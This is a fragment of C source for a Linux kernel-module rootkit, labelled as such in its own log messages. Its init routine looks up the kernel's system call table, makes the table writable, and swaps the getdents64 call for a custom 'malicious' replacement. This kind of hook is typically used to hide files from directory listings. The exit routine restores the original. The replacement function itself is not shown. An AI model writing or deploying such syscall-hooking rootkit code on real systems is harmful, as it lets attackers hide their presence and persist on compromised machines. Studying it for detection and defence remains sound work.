
static int __init rootkit_enter(void) {


	printk(KERN_INFO "rootkit is operating\n");

	//populate the kallsyms_lookup_name function
	kallsyms_lookup_name_ = (void*)kallsyms_lookup_addr;


	//find sys_call_table address
	sys_call_table=(unsigned long*)kallsyms_lookup_name_("sys_call_table");


	// save old getdents64 function
	old_getdents64 = sys_call_table[__NR_getdents64];

	//replace it with our custom getdents64
	set_addr_rw((unsigned long)sys_call_table);
	sys_call_table[__NR_getdents64] = new_getdents64;
	set_addr_ro((unsigned long)sys_call_table);

	printk(KERN_INFO "switched getdents64 syscall to malicious one\n");

	return 0;
}




static void __exit rootkit_exit(void) {

 //restore old getdents64 syscall
	set_addr_rw((unsigned long)sys_call_table);
	sys_call_table[__NR_getdents64] = old_getdents64;
	set_addr_ro((unsigned long)sys_call_table);

	printk(KERN_INFO "rootkit stopped\n");
}


